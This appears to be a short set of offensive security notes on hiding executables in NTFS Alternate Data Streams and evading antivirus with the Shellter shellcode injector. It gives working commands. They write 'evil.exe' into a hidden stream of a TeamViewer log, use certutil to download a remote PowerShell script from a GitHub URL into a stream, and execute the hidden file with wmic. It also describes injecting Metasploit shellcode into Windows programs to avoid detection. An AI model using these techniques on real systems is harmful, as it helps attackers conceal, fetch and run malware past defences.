### Alternate Data Streams:
- File on NTFS formatted drive has 2 streams:
  - Data stream: default stream - contains data
  - Resource stream: used for metadata
  - This is useful to hiding file
- Write to ADS
  -  `type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe" `
- Download directly into ADS
  -  `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt`
- Executing from ADS
  - `wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'`
  - NOTE: full path
- There are many other methods to add and execute
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

### AV evasion with shellter:
- Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can be used in order to inject shellcode into native Windows applications (currently 32-bit apps only). The shellcode can be something yours or something generated through a framework, such as Metasploit. Shellter takes advantage of the original structure of the PE file and doesn’t apply any modification such as changing memory access permissions in sections (unless the user wants to), adding an extra section with RWE access, and whatever would look dodgy under an AV scan.
- Install (https://www.kali.org/tools/shellter/)
  




